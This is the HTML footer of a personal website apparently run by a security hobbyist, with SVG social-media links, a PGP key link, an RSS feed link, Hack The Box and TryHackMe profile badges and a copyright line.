      <a title="GitHub Profile" href="https://github.com/cSh4rk"><span class="icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
</span><span>Shark</span></a>
    </li>
  

  
    <li class="social-media-list">
      <a title="X Profile" href="https://x.com/cSh4rk"><span class="icon"><svg xmlns="http://www.w3.org/2000/svg"  viewBox="0 0 48 48" width="24px" height="24px" clip-rule="evenodd" baseProfile="basic"><polygon fill="#616161" points="41,6 9.929,42 6.215,42 37.287,6"/><polygon fill="#fff" fill-rule="evenodd" points="31.143,41 7.82,7 16.777,7 40.1,41" clip-rule="evenodd"/><path fill="#616161" d="M15.724,9l20.578,30h-4.106L11.618,9H15.724 M17.304,6H5.922l24.694,36h11.382L17.304,6L17.304,6z"/></svg>
</span><span>Shark</span></a>
    </li>
  

  
    <li class="social-media-list">
      <a rel="me" title="Mastodon Profile" href="https://infosec.exchange/@cSh4rk"><span class="icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21.327 8.566c0-4.339-2.843-5.61-2.843-5.61-1.433-.658-3.894-.935-6.451-.956h-.063c-2.557.021-5.016.298-6.45.956 0 0-2.843 1.272-2.843 5.61 0 .993-.019 2.181.012 3.441.103 4.243.778 8.425 4.701 9.463 1.809.479 3.362.579 4.612.51 2.268-.126 3.541-.809 3.541-.809l-.075-1.646s-1.621.511-3.441.449c-1.804-.062-3.707-.194-3.999-2.409a4.523 4.523 0 0 1-.04-.621s1.77.433 4.014.536c1.372.063 2.658-.08 3.965-.236 2.506-.299 4.688-1.843 4.962-3.254.434-2.223.398-5.424.398-5.424zm-3.353 5.59h-2.081V9.057c0-1.075-.452-1.62-1.357-1.62-1 0-1.501.647-1.501 1.927v2.791h-2.069V9.364c0-1.28-.501-1.927-1.502-1.927-.905 0-1.357.546-1.357 1.62v5.099H6.026V8.903c0-1.074.273-1.927.823-2.558.566-.631 1.307-.955 2.228-.955 1.065 0 1.872.409 2.405 1.228l.518.869.519-.869c.533-.819 1.34-1.228 2.405-1.228.92 0 1.662.324 2.228.955.549.631.822 1.484.822 2.558v5.253z"/></svg>
</span><span>Shark</span></a>
    </li>
  

  


  <!--
    <li class="social-media-list">
      <a title="Discord Server" href="https://discord.gg/4btHxXWwgQ"><span class="icon"><?xml version="1.0" ?><svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title/><path d="M20.222 0c1.406 0 2.54 1.137 2.607 2.475V24l-2.677-2.273-1.47-1.338-1.604-1.398.67 2.205H3.71c-1.402 0-2.54-1.065-2.54-2.476V2.48C1.17 1.142 2.31.003 3.715.003h16.5L20.222 0zm-6.118 5.683h-.03l-.202.2c2.073.6 3.076 1.537 3.076 1.537-1.336-.668-2.54-1.002-3.744-1.137-.87-.135-1.74-.064-2.475 0h-.2c-.47 0-1.47.2-2.81.735-.467.203-.735.336-.735.336s1.002-1.002 3.21-1.537l-.135-.135s-1.672-.064-3.477 1.27c0 0-1.805 3.144-1.805 7.02 0 0 1 1.74 3.743 1.806 0 0 .4-.533.805-1.002-1.54-.468-2.14-1.404-2.14-1.404s.134.066.335.2h.06c.03 0 .044.015.06.03v.006c.016.016.03.03.06.03.33.136.66.27.93.4.466.202 1.065.403 1.8.536.93.135 1.996.2 3.21 0 .6-.135 1.2-.267 1.8-.535.39-.2.87-.4 1.397-.737 0 0-.6.936-2.205 1.404.33.466.795 1 .795 1 2.744-.06 3.81-1.8 3.87-1.726 0-3.87-1.815-7.02-1.815-7.02-1.635-1.214-3.165-1.26-3.435-1.26l.056-.02zm.168 4.413c.703 0 1.27.6 1.27 1.335 0 .74-.57 1.34-1.27 1.34-.7 0-1.27-.6-1.27-1.334.002-.74.573-1.338 1.27-1.338zm-4.543 0c.7 0 1.266.6 1.266 1.335 0 .74-.57 1.34-1.27 1.34-.7 0-1.27-.6-1.27-1.334 0-.74.57-1.338 1.27-1.338z"/></svg>
</span><span>Legendary NOoBs</span></a>
    </li>
  -->

  
    <li class="social-media-list">
      <a title="PGP Key" href="/assets/CEE9A66A2F5C6187E4242B0425669795B037FEF2.asc.txt"><span class="icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12.451 17.337l-2.451 2.663h-2v2h-2v2h-6v-5l6.865-6.949c1.08 2.424 3.095 4.336 5.586 5.286zm11.549-9.337c0 4.418-3.582 8-8 8s-8-3.582-8-8 3.582-8 8-8 8 3.582 8 8zm-3-3c0-1.104-.896-2-2-2s-2 .896-2 2 .896 2 2 2 2-.896 2-2z"/></svg>
</span><span>pgp key</span></a>
    </li>
  

  <li class="social-media-list">
    <a title="RSS Feed" href="/feed.xml"><span class="icon-nofill"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#ee802f" d="M6.503 20.752c0 1.794-1.456 3.248-3.251 3.248-1.796 0-3.252-1.454-3.252-3.248 0-1.794 1.456-3.248 3.252-3.248 1.795.001 3.251 1.454 3.251 3.248zm-6.503-12.572v4.811c6.05.062 10.96 4.966 11.022 11.009h4.817c-.062-8.71-7.118-15.758-15.839-15.82zm0-3.368c10.58.046 19.152 8.594 19.183 19.188h4.817c-.03-13.231-10.755-23.954-24-24v4.812z"/></svg>
</span><span>rss</span></a>
  </li>
</ul>

      </div>
      <div class="footer-col-badges col-3 col-s-5">
        <ul>
  
    <li class="social-media-list">
      <a title="Hack The Box Profile" href="https://app.hackthebox.com/profile/768488"><img src="https://www.hackthebox.eu/badge/image/768488" alt="Hack The Box" class="no-responsive"></a>
    </li>
  

  
    <li class="social-media-list">
      <a title="TryHackMe Profile" href="https://tryhackme.com/p/nima"><img src="https://tryhackme-badges.s3.amazonaws.com/nima.png" alt="TryHackMe" class="no-responsive"></a>
    </li>
  
</ul>


      </div>
      <div class="footer-col-copyright col-10 col-s-10 tiny-footer">
        <span>
          favicon made by <a href="https://www.flaticon.com/authors/juicy-fish">juicy-fish</a> from <a href="https://www.flaticon.com">www.flaticon.com</a>
        </span>
        <br>
        <a href="http://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
          <span>
              <b>Nima</b>
          </span>
          
          <span>Â© 2025</span>
        </a>
      </div>
    </div>
  </div>
</footer>


    
  </body>
</html>
